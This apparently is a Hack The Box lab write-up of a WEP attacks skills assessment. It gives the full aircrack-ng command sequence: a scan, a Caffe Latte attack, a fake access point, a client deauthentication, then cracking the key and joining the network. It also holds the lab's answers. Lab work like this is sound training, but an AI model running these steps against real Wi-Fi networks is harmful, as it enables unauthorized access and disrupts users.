---
title: WEP Attacks Skills Assessment
description: WEP Attacks Skills Assessment
date: '2026-09-23'
tags:
  - HTB
  - Skills Assessment
  - Pentesting
  - Wi-Fi
published: true
slug: wep-attacks-skills-assessment
category: Wi-Fi
platform: Hack The Box
difficulty: Easy
---
# WEP Attacks Skills Assessment

For the WEP attacks Skills assessment, first i turned on monitor mode through airmon-ng:

```bash
airmon-ng start wlan0
```

then i scanned the networks using airodump-ng:

```bash
airodump-ng wlan0mon
```

i got:

```
 CH  1 ][ Elapsed: 1 min ][ 2026-09-23 18:43 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:A6:3D:EB:23:A3  -47 100      806        2    0   1   11   WEP  WEP         PixelForge                     

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:A6:3D:EB:23:A3  36:F6:7E:23:60:A8  -29    0 - 1      0        4         PixelForge                         
Quitting...
```

the first question in the skills assessment was `What is the SSID of the network`, which is clearly: `PixelForge`

# Getting the key

For the key, i done the cafe latte attack just because i wasnt sure if there was traffic or not through the client


# Steps

### 1- Turn airodump-ng on again but for channel 1 only (terminal 1):
```
airodump-ng wlan0mon -c 1 -w WEP
```

### 2- Turn on the cafe latte listener (terminal 2)
```
aireplay-ng -6 -D -b B2:A6:3D:EB:23:A3 -h 36:F6:7E:23:60:A8 wlan0mon
```

### 3- Make the fake access point (terminal 3)
```
airbase-ng -c <channel> -a B2:A6:3D:EB:23:A3 -e "PixelForge" wlan0mon -W 1 -L
```

### 4- Deauth Attack (Terminal 4):
```
aireplay-ng -0 10 -a B2:A6:3D:EB:23:A3 -c 36:F6:7E:23:60:A8 wlan0mon
```

### 5- Cracking the key on terminal 1 after turning off airodump-ng:
```
aircrack-ng -b B2:A6:3D:EB:23:A3 WEP-01.cap
```
and we get: `KEY FOUND! [ 1B:2A:5A:4C:6A ]`

# Connecting
Turn off monitor mode first:

```
sudo airmon-ng stop wlan0mon
```
### Step 1: Turn the key into the right format

Aircrack-ng prints the key with colons like 1B:2A:5A:4C:6A, for the config file, just strip the colons out:

`1B2A5A4C6A`

Step 2: Create a config file (wep.conf)
```
network={
    ssid="PixelForge"
    key_mgmt=NONE
    wep_key0=1B2A5A4C6A
    wep_tx_keyidx=0
}
```

Swap PixelForge for the actual ESSID of the network you cracked.

Step 3: Connect

```bash
sudo wpa_supplicant -c wep.conf -i wlan0
```

Step 4: Get an IP address

```bash
sudo dhclient wlan0
```

navigating to:

http://192.168.1.1

We get:
```
REDACTED
```
